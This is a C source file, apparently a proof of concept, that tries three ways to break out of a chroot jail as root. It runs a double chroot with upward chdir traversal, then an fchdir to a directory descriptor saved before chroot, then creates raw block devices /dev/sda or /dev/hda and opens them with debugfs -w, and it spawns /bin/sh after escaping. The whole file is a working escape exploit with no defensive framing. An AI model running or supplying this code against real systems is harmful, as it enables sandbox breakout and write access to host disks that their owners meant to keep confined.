#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/sysmacros.h>
#include <sys/types.h>

#define SHELL "bin/sh"
#define TUNNEL_DIR "escape_tunnel"

static int exists(const char *path) {
    struct stat st;
    return stat(path, &st) == 0;
}

/* Method 1: double chroot + upward directory traversal */
static int method_chdir_up(void) {
    struct stat sb;
    int retries = 1024;

    if (chdir("/") != 0)
        return 1;

    if (!exists(TUNNEL_DIR) && mkdir(TUNNEL_DIR, 0755) != 0)
        return 1;

    if (chroot(TUNNEL_DIR) != 0)
        return 1;

    do {
        if (chdir("..") != 0)
            return 1;
    } while (stat(SHELL, &sb) != 0 && --retries > 0);

    if (retries == 0)
        return 1;

    if (chroot(".") != 0)
        return 1;

    return 0;
}

/* Method 2: file descriptor to / opened before chroot */
static int method_fchdir(void) {
    int fd = open("/", O_RDONLY);
    if (fd < 0)
        return 1;

    if (chdir("/") != 0) {
        close(fd);
        return 1;
    }

    if (!exists(TUNNEL_DIR) && mkdir(TUNNEL_DIR, 0755) != 0) {
        close(fd);
        return 1;
    }

    if (chroot(TUNNEL_DIR) != 0) {
        close(fd);
        return 1;
    }

    if (fchdir(fd) != 0) {
        close(fd);
        return 1;
    }
    close(fd);

    if (chroot(".") != 0)
        return 1;

    return 0;
}

/* Method 3: create block device and access host filesystem */
static int method_mknod(void) {
    if (mknod("/dev/sda", S_IFBLK | 0600, makedev(8, 0)) != 0) {
        if (mknod("/dev/hda", S_IFBLK | 0600, makedev(3, 0)) != 0)
            return 1;
    }

    if (system("debugfs -w /dev/sda 2>/dev/null") == 0 ||
        system("debugfs -w /dev/hda 2>/dev/null") == 0) {
        system("rm -f /dev/sda /dev/hda");
        return 0;
    }

    system("rm -f /dev/sda /dev/hda");
    return 1;
}

int main(void) {
    if (geteuid() != 0) {
        fprintf(stderr, "Root privileges required.\n");
        return 1;
    }

    puts("=== chroot escape POC ===");

    if (method_chdir_up() == 0)
        goto exec_shell;
    puts("Method 1 failed, trying method 2...");

    if (method_fchdir() == 0)
        goto exec_shell;
    puts("Method 2 failed, trying method 3...");

    if (method_mknod() == 0) {
        puts("Method 3 succeeded (device access).");
        return 0;
    }

    fputs("All methods failed. System may be hardened.\n", stderr);
    return 1;

exec_shell:
    execl(SHELL, SHELL, (char *)0);
    perror("execl");
    return 1;
}
